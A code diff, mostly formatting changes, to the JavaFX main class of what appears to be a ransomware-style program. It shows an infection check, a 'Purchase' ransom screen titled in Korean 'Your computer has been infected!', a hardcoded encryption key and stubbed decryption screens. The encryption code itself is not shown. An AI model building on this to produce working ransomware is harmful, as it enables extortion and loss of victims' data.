@@ -12,33 +12,26 @@ public class Main extends Application {
 
     public static Stage stage;
     public static Scene scene;
-    public static EncryptionController encryptionController;
     public static HostServicesDelegate hostServices;
+    public static EncryptionController encryptionController;
 
-    public Main()
-    {
+    public Main() {
         hostServices = HostServicesFactory.getInstance(this);
-        encryptionController= new EncryptionController("WelcomeToDimigo!");
+        encryptionController = new EncryptionController("WelcomeToDimigo!");
     }
 
-    public static void main(String[] args)
-    {
+    public static void main(String[] args) {
         launch(args);
     }
 
     @Override
     public void start(Stage stage) throws Exception {
-
-
-        if(encryptionController.isEncrypted())
-        {
-            System.out.print("이미 감염되있는 PC입니다");
+        if (encryptionController.isEncrypted()) {
+            System.out.print("이미 감염되있는 PC 입니다");
             scene = new Scene(FXMLLoader.load(getClass().getResource("Purchase.fxml")));
             stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
             stage.setScene(scene);
-        }
-        else
-        {
+        } else {
             scene = new Scene(FXMLLoader.load(getClass().getResource("MainPage.fxml")));
             stage.setScene(scene);
 
@@ -51,21 +44,20 @@ public class Main extends Application {
         Main.stage = stage;
         Main.stage.show();
     }
-    public static void changeToUndecryptedScene()
-    {
+
+    public static void changeToUndecryptedScene() {
         System.out.print("복호화 화면으로 전환합니다");
 //        this.scene = new Scene(FXMLLoader.load(getClass().getResource("Undecripted.fxml")));
 //        stage.setScene(this.scene);
     }
-    public static void changeToCompleteScene()
-    {
+
+    public static void changeToCompleteScene() {
         System.out.print("복호화 축하 화면으로 전환합니다");
 //        this.scene = new Scene(FXMLLoader.load(getClass().getResource("Undecripted.fxml")));
 //        stage.setScene(this.scene);
     }
 
-    public static void viewWeb(String url)
-    {
+    public static void viewWeb(String url) {
         hostServices.showDocument(url);
     }
 
